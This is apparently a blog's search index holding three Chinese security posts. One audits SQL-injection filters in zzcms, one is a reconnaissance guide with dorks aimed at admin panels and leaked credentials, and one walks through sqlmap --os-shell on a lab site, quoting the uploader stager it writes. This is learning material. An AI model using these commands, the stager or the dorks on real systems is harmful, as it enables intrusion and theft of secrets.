<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>代码审计之SQL注入</title>
    <link href="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h4 id="代码审计初级"><a href="#代码审计初级" class="headerlink" title="代码审计初级"></a>代码审计初级</h4><p>seay代码审计工具-&gt;面向过程可用</p><p>审计思路:</p><p>1.通读网站,了解其路由方式,大概知道有什么过滤函数-&gt;优点:大概了解作者的编程思路和防御手法-&gt;但是耗时长</p><p>2.定位敏感函数和敏感关键词上下文调用流程了解和过滤手法.xdebug调</p><p>2019的zzcms审计:</p><p>在seay审计工具的帮助下快速找到切入点进行审计构造第一个数据包进行分析</p><p>因为前期已经尝试不正确方式去探测过滤手法,现在直接用绕过手法演示</p><p>注意 error_reporting(0)表示错误等级为0,并不会出现错误信息</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024132840941.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024131531482.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024131704209.png"></p><p>stopsqlin.php文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//主要针对在任何文件后加?%3Cscript%3E，即使文件中没有参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<span class="hljs-string">&#x27;script&#x27;</span>)!==<span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<span class="hljs-string">&#x27;%26%2399%26%&#x27;</span>)!==<span class="hljs-literal">false</span>|| <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<span class="hljs-string">&#x27;%2F%3Cobject&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;无效参数&quot;</span>);<span class="hljs-comment">//注意这里不能用js提示</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">zc_check</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$string</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123; <span class="hljs-comment">//判断是否开启全局gpc，如果没有开启则再加addslashes（）进行转移特殊字符操作</span><br> <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$string</span>)); <span class="hljs-comment">//把特殊字符实体化并过滤空格</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$string</span>)));<br>&#125;<br> &#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$string</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) <span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>] = <span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//进行循环遍历这个数组，并且进行过滤操作</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>)&#123; <span class="hljs-comment">//判断是否具有请求发送到</span><br><span class="hljs-variable">$_POST</span> =<span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//这里会进行整合，对应的请求参数赋给对应的值</span><br><span class="hljs-variable">$_GET</span> =<span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-variable">$_COOKIE</span> =<span class="hljs-title function_ invoke__">zc_check</span>(<span class="hljs-variable">$_COOKIE</span>);<br>@<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>); <span class="hljs-comment">//从数组中将变量导入到当前的符号表 通俗易懂就是将数组的key作为变量名，数组的值作为变量的值</span><br>@<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><span class="hljs-comment">//特别的表单，需要特别提示的</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nostr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-comment">//strip_tags($str);</span><br><span class="hljs-variable">$sql_injdata</span> = <span class="hljs-string">&quot;&#x27;,/,\,&lt;,&gt;,�,select&quot;</span>;<br>    <span class="hljs-variable">$sql_inj</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_injdata</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$sql_inj</span>);<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>])!==<span class="hljs-literal">false</span>)&#123; <br><span class="hljs-title function_ invoke__">showmsg</span> (<span class="hljs-string">&quot;含有非法字符 [&quot;</span>.<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;] 返回重填&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<span class="hljs-comment">//没有的返回值</span><br>&#125;<br><br><span class="hljs-comment">//过滤指定字符,</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopsqlin</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$str</span>)) &#123;<span class="hljs-comment">//有数组数据会传过来比如代理留言中的省份$_POST[&#x27;province&#x27;][$i]</span><br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$str</span>);<span class="hljs-comment">//否则过过滤不全 //防止大小写绕过</span><br><br><span class="hljs-variable">$sql_injdata</span> = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义一个空字符串</span><br><span class="hljs-variable">$sql_injdata</span>= <span class="hljs-variable">$sql_injdata</span>.<span class="hljs-string">&quot;|&quot;</span>.stopwords; <span class="hljs-comment">//stopwords也是作者预先定义的敏感词过滤全局变量</span><br><span class="hljs-variable">$sql_injdata</span>=<span class="hljs-title function_ invoke__">CutFenGeXian</span>(<span class="hljs-variable">$sql_injdata</span>,<span class="hljs-string">&quot;|&quot;</span>);<br><br>    <span class="hljs-variable">$sql_inj</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$sql_injdata</span>); <span class="hljs-comment">//遍历以分割线为1分割字符串进行分割组成一个数组，</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$sql_inj</span>);<span class="hljs-variable">$i</span>++)&#123; <span class="hljs-comment">//遍历禁用词数组</span><br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>])!==<span class="hljs-literal">false</span>) &#123;<span class="hljs-title function_ invoke__">showmsg</span> (<span class="hljs-string">&quot;参数中含有非法字符 [&quot;</span>.<span class="hljs-variable">$sql_inj</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;] 系统不与处理&quot;</span>);&#125;  <span class="hljs-comment">//判断我们传进来的参数是否在禁用数组，如果在调用showmsg函数</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$r_url</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]); <span class="hljs-comment">//对传入的uri赋值然后在进行判断是否为以下的uri，如果是则不进行stopsqlin（）的过滤sql关键字(注意哲理拿不到post得参数值,所以绕过操作只能痛过get来)</span><br><span class="hljs-keyword">if</span> (checksqlin==<span class="hljs-string">&quot;Yes&quot;</span>) &#123; <span class="hljs-comment">//这是一个作者预先定义的一个全局变量</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$r_url</span>,<span class="hljs-string">&quot;siteconfig.php&quot;</span>)==<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$r_url</span>,<span class="hljs-string">&quot;label&quot;</span>)==<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$r_url</span>,<span class="hljs-string">&quot;template.php&quot;</span>)==<span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$get_key</span>=&gt;<span class="hljs-variable">$get_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$get_var</span>);&#125; <span class="hljs-comment">/* 过滤所有GET过来的变量 */</span>      <br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post_key</span>=&gt;<span class="hljs-variable">$post_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$post_var</span>);&#125;<span class="hljs-comment">/* 过滤所有POST过来的变量 */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_COOKIE</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$cookie_key</span>=&gt;<span class="hljs-variable">$cookie_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$cookie_var</span>);&#125;<span class="hljs-comment">/* 过滤所有COOKIE过来的变量 */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$request_key</span>=&gt;<span class="hljs-variable">$request_var</span>)&#123; <span class="hljs-title function_ invoke__">stopsqlin</span>(<span class="hljs-variable">$request_var</span>);&#125;<span class="hljs-comment">/* 过滤所有request过来的变量 */</span><br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024131920703.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024132141839.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024132622890.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024133441291.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024133233839.png"></p><h6 id="其它注入点-后台的一个注入-需要登录"><a href="#其它注入点-后台的一个注入-需要登录" class="headerlink" title="其它注入点:后台的一个注入,需要登录"></a>其它注入点:后台的一个注入,需要登录</h6><p>cookie注入</p><p><a href="http://www.zz.com/admin/ask.php">http://www.zz.com/admin/ask.php</a></p><p>前期也要经过stopsqlin.php进行过滤,但是可以绕过</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024152015281.png"></p><p>只有管理员才能正常访问admin&#x2F;ask.php</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024153107248.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024152833284.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024152954181.png"></p><p>这个SQL注入回显位在数据包中显示</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024155637207.png"></p><p>admin&#x2F;bad.php也存在时间注入</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024164212216.png"></p><p>因为前面的绕过已经讲过了,现在就直接绕过这个文件的限制</p><p>id参数要求必为一个数组,好像只能用sleep(5)</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024164539008.png"></p><p>今晚自己再次卖力的审计发现还有一处sql注入点,当我看见echo输出的时候,眼睛都亮了.不管了直接喜欢union select 联合注入</p><p>注入点:admin&#x2F;sendmail.php</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024205223881.png"></p><p>需要groupid(必要的)我们就给他传进去</p><p>关键点:</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024205314312.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024211633170.png"></p><p>中间很傻淦,在哪数字段,三十八个,想想就憨批,对啊,就是三十八个,为啥一致字段数不匹配.一下子没反应过来它只显示一个字段</p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024205723737.png"></p><p><img src="/2021/10/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20221024210825177.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计（SQL注入）</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2021/05/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/05/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>今天就来谈谈当我们拿到一个网站首先干的一件事情-信息收集</p><p>如果信息收集的比较全面,就意味着你这次的渗透测试工作已经成功了一半.<br>信息收集的内容包括目标系统的架构,ip资产,敏感信息,合作商等等.</p><p>一.域名<br>1.备案查询 通过下面这些网站可以查询到一些域名邮箱电话等信息<br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p><p>官方ICP备案查询：<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p><p>2.fofa,google查询</p><p>语法:<br>domain&#x3D;”example.com”<br>header&#x3D;”example.com”<br>cert&#x3D;”example.com”<br>host&#x3D;”example.com”<br>body&#x3D;”example.com”<br>它们语法都差不多</p><p>3.证书查询<br>网站查询：<a href="https://crt.sh/?q=baidu.com">https://crt.sh/?q=baidu.com</a></p><p>5.dns查询<br>6.whois查询<br>通过查询目标的WHOIS信息，对联系人、联系邮箱等信息进行反查以及查看whois历史信息，获取更多相关的域名信息；微步在线也可以根据IP、邮箱等查询历史域名。</p><p>7.通过众测平台查询资产范围，在众测平台上有些厂商会把资产范围放出来。</p><p>8.通过主域名对子域名进行搜索，可使用工具、搜索引擎等。</p><p>OneForAll：集成多种方式搜集子域名，包括dns查询、证书查询等；</p><p>Amass：kali自带，集成多种收集方式，强烈推荐；</p><p><a href="https://crt.sh/%EF%BC%9A%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E6%9F%A5%E6%89%BE%E5%AD%90%E5%9F%9F%E5%90%8D%E5%92%8C%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9B">https://crt.sh/：通过证书查找子域名和指纹识别；</a></p><p><a href="https://dnsdumpster.com：是一个在线实用程序，可以查找子域、目标的DNS记录。">https://dnsdumpster.com：是一个在线实用程序，可以查找子域、目标的DNS记录。</a></p><p>9.直接访问收集到的主域名，对网页上指向的域名链接进行收集（可能会放一些OA等办公系统的跳转）。</p><p>10.枚举域名</p><p><a href="https://github.com/infosec-au/altdns%EF%BC%8C">https://github.com/infosec-au/altdns，</a> Altdns是一个DNS侦察工具，允许发现符合模式的子域。Altdns接收可能出现在域下的子域中的单词（如 test、dev、staging），并接收您知道的子域列表。</p><p>11.收集APP、公众号、小程序、PC应用资产</p><p>11.1 天眼查、企查查<br>11.2 微信APP搜索（小程序、公众号）</p><p>11.3 支付宝搜索（小程序、公众号）</p><p>11.4 工具ENScan（可查询企业APP信息、微信公众号信息、供应商信息等）</p><p>11.5 APP 查找应用商店、豌豆荚（可下载历史app）</p><p>11.6 PC可通过官网进行查找下载</p><p>12.根据前几种方式获取相关IP，然后探测可能存在的C段，可获取一些没有相关联信息的隐藏资产，再通过IP反查域名（<a href="https://github.com/Sma11New/ip2domain%EF%BC%89">https://github.com/Sma11New/ip2domain）</a></p><p>IP收集<br>1.真实IP查找</p><p>CDN判断：</p><p>多地ping，全球ping，查看解析IP是否一致；</p><p>NSlookup：通过nslookup查看不同DNS域名解析情况来判断是否使用了CDN；</p><p>在线检测：<a href="https://www.cdnplanet.com/tools/cdnfinder/%EF%BC%9B">https://www.cdnplanet.com/tools/cdnfinder/；</a></p><p>通过https证书：有的cdn颁发的证书带有cdn名称，可通过https证书进行cdn识别；</p><p>真实IP查找：</p><p>通过查询历史DNS记录站点在做CDN之前可能将域名解析到真实IP，通过查询DNS历史记录可能会找到CDN使用前的真实IP，<a href="https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html%EF%BC%9B">https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html；</a></p><p>子域查询法：CDN服务的使用成本还是挺高的，所以很多的站点只对流量大的主站做了CDN，这种情况下我们通过子域枚举就能获取到子站的真实IP，再进行C段；</p><p>全球ping：很多CDN厂商因为某些原因仅对国内线路做了解析，这种情况下使用国外主机直接访问就可能获取到真实IP；</p><p>通过网站漏洞，如：phpinfo；</p><p>需要找xiaix.me网站的真实IP，我们首先从apnic获取IP段，然后使用Zmap的banner-grab扫描出来80端口开放的主机进行banner 抓取，最后在http-req中的Host写xiaix.me；</p><p>利用应用功能，抓取反向连接查找服务器IP，或者根据应用返回&#x2F;报错查看。</p><p>2.通过IP地址注册信息查询：<a href="https://ipwhois.cnnic.net.cn/">https://ipwhois.cnnic.net.cn/</a></p><p>3.对上面域名解析获得的单个IP输入查询框，会有一个IP范围</p><p>4.使用FOFA等互联网资产收集工具直接搜索公司名称</p><p>5.C段扫描</p><p>rustscan：速度快；</p><p>goby：图形化直观，支持漏洞验证，端口扫描；</p><p>fscan：速度快，主机存活探测、端口扫描、常见服务的爆破。</p><p>敏感信息收集<br>1.利用Google</p><p>Google常用语法：site:<em>.test.cn filetype:xlsx 学号 site:</em>.test.cn filetype:docx | pdf | csv | json</p><p>搜集管理后台：site:xxx.com 管理、site:xxx.com admin、site:xxx.com login 搜集mail：site:xxx.com intext:@xxx.com 搜集敏感web路径：site:xxx.com intitle:登录／site:xxx.com inurl:sql.php</p><p>site:*.xxx.com intext:Index of&#x2F;</p><p>其他语法：<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><p>2.利用托管平台，如：GitHub、码云等</p><p>GitHub常用语法：</p><p>敏感信息：xx.com “关键字”</p><p>文件搜索：xxx.com filename:properties</p><p>关键字：Passwords api_key “api keys” authorization_bearer: oauth auth authentication client_secret api_token: “api token” client_id password user_password user_pass passcode client_secret secret password hash OTP user auth</p><p>注意事项：如果搜索含有空格的查询，需要用引号将其括起来；</p><p>3.目录扫描</p><p>备份文件&#x2F;默认后台</p><p>源码泄露（.git&#x2F;.svn）</p><p>通过上面的收集能拿到：域名、IP、邮箱、姓名、手机号等，但需要验证是否属于该单位资产，以及需要对域名以及IP进行存活探测、端口扫描、web指纹识别、目录扫描等，快速定位到易被攻击的系统，从而实施进一步攻击。</p><p>存活探测，敏感资产定位<br><a href="https://github.com/EASY233/Finger%EF%BC%9A%E4%B8%80%E6%AC%BE%E7%BA%A2%E9%98%9F%E5%9C%A8%E5%A4%A7%E9%87%8F%E7%9A%84%E8%B5%84%E4%BA%A7%E4%B8%AD%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B%E4%B8%8E%E9%87%8D%E7%82%B9%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E6%8E%A2%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9B">https://github.com/EASY233/Finger：一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具；</a></p><p><a href="https://github.com/al0ne/Vxscan%EF%BC%9Apython3%E5%86%99%E7%9A%84%E7%BB%BC%E5%90%88%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%BB%E8%A6%81%E7%94%A8%E6%9D%A5%E5%AD%98%E6%B4%BB%E9%AA%8C%E8%AF%81%EF%BC%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/js%E6%B3%84%E9%9C%B2%E6%8E%A5%E5%8F%A3/html%E6%B3%A8%E9%87%8A%E6%B3%84%E9%9C%B2)%EF%BC%8CWAF/CDN%E8%AF%86%E5%88%AB%EF%BC%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%8C%E6%8C%87%E7%BA%B9/%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E7%AD%89%EF%BC%9B">https://github.com/al0ne/Vxscan：python3写的综合扫描工具，主要用来存活验证，敏感文件探测(目录扫描/js泄露接口/html注释泄露)，WAF/CDN识别，端口扫描，指纹/服务识别等；</a></p><p><a href="https://github.com/EdgeSecurityTeam/EHole%EF%BC%9A%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%9C%9F%E9%97%B4%E8%83%BD%E5%A4%9F%E5%BF%AB%E9%80%9F%E4%BB%8EC%E6%AE%B5%E3%80%81%E5%A4%A7%E9%87%8F%E6%9D%82%E4%B9%B1%E7%9A%84%E8%B5%84%E4%BA%A7%E4%B8%AD%E7%B2%BE%E5%87%86%E5%AE%9A%E4%BD%8D%E5%88%B0%E6%98%93%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%AE%9E%E6%96%BD%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%94%BB%E5%87%BB%E3%80%82">https://github.com/EdgeSecurityTeam/EHole：在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。</a></p><p>学习于：白帽子左一</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap流量分析</title>
    <link href="/2021/02/01/sqlmap1/"/>
    <url>/2021/02/01/sqlmap1/</url>
    
    <content type="html"><![CDATA[<p>十、使用shell命令:<br>参数–os-shell(分析一下)<br>前提:需要网站的物理路径，其次是需要有FIILE权限。<br>sqlmap -r“C:\sqlmap\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写日录:<br>“C: \www”<br>d: \phpstudy \www(成功)</p><p>以印度朋友写的靶场开搞</p><p><a href="http://www.sql.com/Less-1/?id=1">http://www.sql.com/Less-1/?id=1</a></p><p>平常我们直接上马可能会被过滤掉后缀禁止上传，那如果我们也想sqlmap一样，先上传一个具有上传功能的文件，然后再继续上传马子就不会有黑名单拦截。</p><p>现在就可以看看sqlmap是怎么操作的了</p><p>在进行之前，先判断是否为管理员，以防写不进去</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.sql.com/Less-1/?id=1&quot;</span> --<span class="hljs-keyword">is</span>-dba<br></code></pre></td></tr></table></figure><p>具备写文件的条件之一</p><p><img src="/2021/02/01/sqlmap1/image-20221023194902258.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.sql.com/Less-1/?id=1&quot;</span> --os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>第一步先让你选择什么类型的网站1，第二部让你选写入什么类型的马</p><p>假如我们有网站的绝对路径</p><p>注意哈：我们只能在当前文件夹操作，因为我们并没有操作其他文件夹的权限</p><p><img src="/2021/02/01/sqlmap1/image-20221023200811003.png"></p><p><img src="/2021/02/01/sqlmap1/image-20221023200939871.png"></p><p>进行burpsuite抓包分析</p><p><img src="/2021/02/01/sqlmap1/image-20221023202716803.png"></p><p><img src="/2021/02/01/sqlmap1/image-20221023202827472.png"></p><p>这是第一个写入服务器的文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;upload&quot;</span>]))&#123;<span class="hljs-comment">//判断是否有文件上传，如果没有输出类似于文件上传功能的html页面</span><br>    <span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;uploadDir&quot;</span>];<span class="hljs-comment">//这些参数在注入之前我们已经填充过了</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">phpversion</span>()&lt;<span class="hljs-string">&#x27;4.1.0&#x27;</span>)&#123; <span class="hljs-comment">//判断什么版本</span><br>        <span class="hljs-variable">$file</span>=<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>】[<span class="hljs-string">&quot;name&quot;</span>];<br>           @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span 